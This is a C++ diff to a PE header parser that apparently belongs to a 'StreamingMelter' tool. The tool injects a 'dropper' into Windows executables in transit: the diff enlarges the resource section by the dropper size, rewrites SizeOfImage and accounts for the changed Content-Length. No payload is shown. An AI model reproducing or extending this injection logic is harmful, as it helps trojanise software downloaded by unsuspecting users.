@@ -184,7 +184,6 @@ bool ParseHeaders::parseSectionHeaders()
    {
       if (!memcmp(&buffer[i], "_SFX_CAB_EXE_PATH", 17))
       {
-         //DEBUG_MSG(D_INFO, "For security reason I'm not gonna melt cab files");
          throw parsing_error("For security reason I'm not gonna melt cab files");
       }
    }
@@ -249,12 +248,6 @@ StateResult ParseHeaders::process()
 	// Change SizeOfImage accordingly
 	ImageSectionHeader& lastSection = context<StreamingMelter>().lastSection();
 
-	DWORD predictedSizeOfImage = alignTo( lastSection->VirtualAddress + lastSection->Misc.VirtualSize + dropper.size(), ntHeaders_->OptionalHeader.SectionAlignment );
-	DWORD sizeOfImageSkew = predictedSizeOfImage - ntHeaders_->OptionalHeader.SizeOfImage;
-	ntHeaders_->OptionalHeader.SizeOfImage = predictedSizeOfImage;
-	DEBUG_MSG(D_INFO, "SizeOfImage changed to %d", ntHeaders_->OptionalHeader.SizeOfImage);
-
-	DEBUG_MSG(D_INFO, "Content-Length will differ by %d", sizeOfImageSkew);
 
 	// save NT header for future reference
 	PEInfo& pe = context<StreamingMelter>().pe();
@@ -275,12 +268,14 @@ StateResult ParseHeaders::process()
 	int rsrcFlag = 0;
 	unsigned long prevPointerToRaw, prevSizeOfRaw, prevVirtualAddr, prevVirtualSize;
 	std::size_t numberOfSections = context<StreamingMelter>().numberOfSections();
+	DWORD predictedSizeOfImage = 0x1000;
 	for (std::size_t sectionIdx = 0; sectionIdx < numberOfSections; ++sectionIdx)
 	{
 		if (!sectionHeader)
 			throw parsing_error("Invalid section header.");
 
-		if (sectionHeader->VirtualAddress == rsrcHeader->VirtualAddress) {
+		if (sectionHeader->VirtualAddress == rsrcHeader->VirtualAddress) 
+		{
 			if (sectionHeader->Misc.VirtualSize < sectionHeader->SizeOfRawData)
 			{
 				sectionHeader->Misc.VirtualSize = sectionHeader->Misc.VirtualSize + dropper.size();
@@ -294,7 +289,7 @@ StateResult ParseHeaders::process()
 
 			//sectionHeader->SizeOfRawData = alignTo(sectionHeader->SizeOfRawData + dropper.size(), context<StreamingMelter>().fileAlignment());
 			//sectionHeader->Misc.VirtualSize = alignTo(sectionHeader->Misc.VirtualSize + dropper.size(), context<StreamingMelter>().sectionAlignment());
-			sectionHeader->Characteristics |= IMAGE_SCN_MEM_WRITE;
+			//sectionHeader->Characteristics |= IMAGE_SCN_MEM_WRITE;
 
 			DEBUG_MSG(D_VERBOSE, "Resource section: %s", (PCHAR) rsrcHeader->Name);
 			DEBUG_MSG(D_VERBOSE, "\tDropper size: %08x", dropper.size());
@@ -318,8 +313,17 @@ StateResult ParseHeaders::process()
 			prevVirtualSize = sectionHeader->Misc.VirtualSize;
 		}
 
+		predictedSizeOfImage += alignTo(sectionHeader->Misc.VirtualSize, context<StreamingMelter>().sectionAlignment());
+
 		++sectionHeader;
 	}
+	//printf("VA: %08x, SIZE: %08x, TOT: %08x\n", lastSection->VirtualAddress, lastSection->Misc.VirtualSize, lastSection->VirtualAddress + lastSection->Misc.VirtualSize);
+	//DWORD predictedSizeOfImage = alignTo( lastSection->VirtualAddress + lastSection->Misc.VirtualSize + dropper.size(), ntHeaders_->OptionalHeader.SectionAlignment );
+	//DWORD predictedSizeOfImage = alignTo( lastSection->VirtualAddress + lastSection->Misc.VirtualSize, ntHeaders_->OptionalHeader.SectionAlignment );
+	DWORD sizeOfImageSkew = predictedSizeOfImage - ntHeaders_->OptionalHeader.SizeOfImage;
+	ntHeaders_->OptionalHeader.SizeOfImage = predictedSizeOfImage;
+	DEBUG_MSG(D_INFO, "SizeOfImage changed to %d", ntHeaders_->OptionalHeader.SizeOfImage);
+	DEBUG_MSG(D_INFO, "Content-Length will differ by %d", sizeOfImageSkew);
 
 	// locate entry point
 	ImageSectionHeader& textHeader = context<StreamingMelter>().textSection();
